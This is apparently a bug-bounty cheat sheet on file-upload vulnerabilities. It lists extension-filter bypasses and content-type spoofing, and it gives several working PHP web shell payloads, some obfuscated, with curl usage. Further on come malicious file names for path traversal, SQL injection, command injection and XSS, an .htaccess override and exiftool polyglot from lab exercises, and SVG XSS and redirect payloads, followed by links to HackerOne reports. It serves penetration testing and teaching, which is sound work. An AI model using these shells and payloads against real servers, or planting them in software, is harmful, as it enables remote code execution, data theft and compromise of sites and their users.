# File-Upload

> **File extension**

```
# extension blacklisted:
PHP: .phtm, phtml, .phps, .pht, .php2, .php3, .php4, .php5, .shtml, .phar, .pgif, .inc
ASP: .asp, .aspx, .cer, .asa
Jsp: .jsp, .jspx, .jsw, .jsv, .jspf
Coldfusion: .cfm, .cfml, .cfc, .dbm
Using random capitalization: .pHp, .pHP5, .PhAr
pht,phpt,phtml,php3,php4,php5,php6,php7,phar,pgif,phtm,phps,shtml,phar,pgif,inc
# extension whitelisted:
file.jpg.php
file.php.jpg
file.php.blah123jpg
file.php%00.jpg
file.php\\x00.jpg
file.php%00
file.php%20
file.php%0d%0a.jpg
file.php.....
file.php/
file.php.\\
file.
.html
```

* [ ] Upload `asp` file using `.cer` & `.asa` extension (IIS — Windows)
* [ ] Upload `.eml` file when `content-type = text/HTML`

> _**Payloads**_

```php
<?php system($_GET["cmd"]);?> # ?cmd= (ex: ?cmd=ls -la")
<?=`$_GET[0]`?>               # ?0=command

<?=`$_POST[0]`?>          
# Usage : curl -X POST http://target.com/path/to/shell.php -d "0=command"

<?=`{$_REQUEST['_']}`?>      
# Usage: http://target.com/path/to/shell.php?_=command OR curl -X POST http://target.com/path/to/shell.php -d "_=command" '

<?=$_="";$_="'" ;$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`?>
# Usage : http://target.com/path/to/shell.php?0=command

<?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?><?=${'_'.$_}['_'](${'_'.$_}['__']);?>
# Usage : http://target.com/path/to/shell.php?_=function&__=argument http://target.com/path/to/shell.php?_=system&__=ls
```

> **Content type**

```
- Preserve name, but change content-type
Content-Type: image/jpeg, image/gif, image/png
```

> **Content length**

```
# Small bad code:
<?='$_GET[x]'?>    
```

> **Impact by extension**

```go
asp, aspx, php5, php, php3: -->  webshell, rce
svg:                        --> stored xss, ssrf, xxe
gif:                        --> stored xss, ssrf
csv:                        --> csv injection
xml:                        --> xxe 
avi:                        --> lfi, ssrf
html, js:                   --> html injection, xss, open redirect
png, jpeg:                  --> pixel flood attack dos
zip:                        --> rce via lfi, dos
pdf, pptx:                  --> ssrf, blind xxe
```

> **File name**

* [ ] Path traversal `../../etc/passwd/logo.png` `../../../logo.png`
* [ ] SQLi `'sleep(10).jpg` `sleep(10)-- -.jpg`
* [ ] Command injection `; sleep 10;`
* [ ] XSS `<svg onload=alert(document.comain)>.svg`

> **Other Test Cases**

*   [ ] Image-Tragic SVG images are just XML data. Using XML you can achieve lots of vulnerabilities, for instance Image Magic which is an image processing library is vulnerable to SSRF and RCE vulnerabilities.

    Source (Facebook RCE): [Facebook's ImageTragick Remote Code Execution (4lemon.ru)](http://4lemon.ru/2017-01-17\_facebook\_imagetragick\_remote\_code\_execution.html)
*   [ ] [**Web shell upload via extension blacklist bypass**](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass) **\[Overriding the server configuration]**

    ```php
    ------WebKitFormBoundary0G2tBRqMoRVtGqfG
    Content-Disposition: form-data; name="avatar"; filename=".htaccess"
    Content-Type: text/plain

    AddType application/x-httpd-php .l33t
    ------------------------------------------
    then 
    ------WebKitFormBoundary0G2tBRqMoRVtGqfG
    Content-Disposition: form-data; name="avatar"; filename="exploit.l33t"
    Content-Type: application/octet-stream

    <?php echo file_get_contents('/home/carlos/secret'); ?>
    ------WebKitFormBoundary0G2tBRqMoRVtGqfG
    ```
*   [ ] [**Remote code execution via polyglot web shell upload**](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)

    ```php
    exiftool.exe -Comment="<?php echo 'START ' . 'Hacked By h0tak88r :)' . ' END'; ?>" download.png -o polyglot.php
    ```
* [ ] EXIF-DATA not Stripped
  1. Got to Github ( https://github.com/ianare/exif-samples/tree/master/jpg)\

  2. There are lot of images having resolutions (i.e 1280 \* 720 ) , and also whith different MB’s .\

  3. Go to Upload option on the website\

  4. Upload the image\

  5. see the path of uploaded image ( Either by right click on image then copy image address OR right click, inspect the image, the URL will come in the inspect , edit it as html )
  6. open it (http://exif.regex.info/exif.cgi)
  7. See whether is that still showing exif data , if it is then Report it. **Reports (Hackerone)**
  8. [IDOR with Geolocation data not stripped from images](https://hackerone.com/reports/906907)

> **File Upload Exploitation**

*   **SVG file To XSS**

    ```jsx
    	<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    	<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
    	<script type="text/javascript">
    	alert("h0tak88r XSS");
    	</script>
    	</svg>
    ```
*   **Open Redirect when uploading svg files**

    ```xml
        <code>
        <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
        <svg
        onload="window.location='<http://www.google.com>'"
        xmlns="<http://www.w3.org/2000/svg>">
        </svg>
        </code>
        
    ```

## Top Upload reports from HackerOne:

1. [Remote Code Execution on www.semrush.com/my\_reports on Logo upload](https://hackerone.com/reports/403417) to Semrush - 792 upvotes, $0
2. [Webshell via File Upload on ecjobs.starbucks.com.cn](https://hackerone.com/reports/506646) to Starbucks - 673 upvotes, $0
3. [Blind XSS on image upload](https://hackerone.com/reports/1010466) to CS Money - 412 upvotes, $1000
4. [Unrestricted file upload on \[ambassador.mail.ru\] ](https://hackerone.com/reports/854032)to Mail.ru - 404 upvotes, $3000
5. [\[ RCE \] Through stopping the redirect in /admin/\* the attacker able to bypass Authentication And Upload Malicious File](https://hackerone.com/reports/683957) to Mail.ru - 340 upvotes, $0
6. [Unrestricted file upload leads to Stored XSS](https://hackerone.com/reports/808862) to Visma Public - 268 upvotes, $250
7. [SSRF leaking internal google cloud data through upload function \[SSH Keys, etc..\]](https://hackerone.com/reports/549882) to Vimeo - 249 upvotes, $0
8. [Arbitrary File Upload to Stored XSS](https://hackerone.com/reports/808821) to Visma Public - 245 upvotes, $250
9. [Unrestricted File Upload Leads to RCE on mobile.starbucks.com.sg](https://hackerone.com/reports/1027822) to Starbucks - 225 upvotes, $0
10. [Admin Management - Login Using Default Password - Leads to Image Upload Backdoor/Shell](https://hackerone.com/reports/699030) to Razer - 199 upvotes, $200
11. [External SSRF and Local File Read via video upload due to vulnerable FFmpeg HLS processing](https://hackerone.com/reports/1062888) to TikTok - 139 upvotes, $2727
12. [Unrestricted file upload in www.semrush.com > /my\_reports/api/v1/upload/image](https://hackerone.com/reports/748903) to Semrush - 124 upvotes, $0
13. [User can upload files even after closing his account](https://hackerone.com/reports/1020371) to Basecamp - 114 upvotes, $0
14. [XXE Injection through SVG image upload leads to SSRF](https://hackerone.com/reports/897244) to Zivver - 112 upvotes, $0
15. [Insecure file upload in xiaoai.mi.com Lead to Stored XSS](https://hackerone.com/reports/882733) to Xiaomi - 107 upvotes, $0
16. [Unrestricted File Upload on https://partner.tiktokshop.com/wsos\_v2/oec\_partner/upload](https://hackerone.com/reports/1890284) to TikTok - 98 upvotes, $0
17. [\[insideok.ru\] Remote Command Execution via file upload.](https://hackerone.com/reports/666716) to ok.ru - 94 upvotes, $0
18. [Avatar upload allows arbitrary file overwriting](https://hackerone.com/reports/671605) to Mail.ru - 88 upvotes, $750
19. [Unrestricted file upload leads to Stored XSS](https://hackerone.com/reports/880099) to GitLab - 82 upvotes, $0
20. [Unauthenticated user can upload an attachment to the last updated report draft](https://hackerone.com/reports/419896) to HackerOne - 80 upvotes, $0
21. [XSS from arbitrary attachment upload.](https://hackerone.com/reports/831703) to Qulture.Rocks - 74 upvotes, $0
22. [Open s3 bucket allows for public upload](https://hackerone.com/reports/504600) to Augur - 73 upvotes, $100
23. [SSRF and local file disclosure by video upload on https://www.redtube.com/upload](https://hackerone.com/reports/570537) to Pornhub - 61 upvotes, $500
24. [Cross site scripting via file upload in subdomain ads.tiktok.com](https://hackerone.com/reports/1433125) to TikTok - 59 upvotes, $500
25. [Unrestricted file upload when creating quotes allows for Stored XSS](https://hackerone.com/reports/788397) to Visma Public - 57 upvotes, $250
26. [Singapore - Unrestricted File Upload Leads to XSS on campaign.starbucks.com.sg/api/upload](https://hackerone.com/reports/883151) to Starbucks - 57 upvotes, $0
27. [Stored XSS on upload files leads to steal cookie](https://hackerone.com/reports/765679) to Palo Alto Software - 56 upvotes, $0
28. [SSRF and local file disclosure by video upload on https://www.tube8.com/](https://hackerone.com/reports/574133) to Pornhub - 53 upvotes, $500
29. [Unrestricted File Upload Results in Cross-Site Scripting Attacks](https://hackerone.com/reports/1005355) to Uber - 53 upvotes, $0
30. [SSRF in VCARD photo upload functionality](https://hackerone.com/reports/296045) to Open-Xchange - 49 upvotes, $850
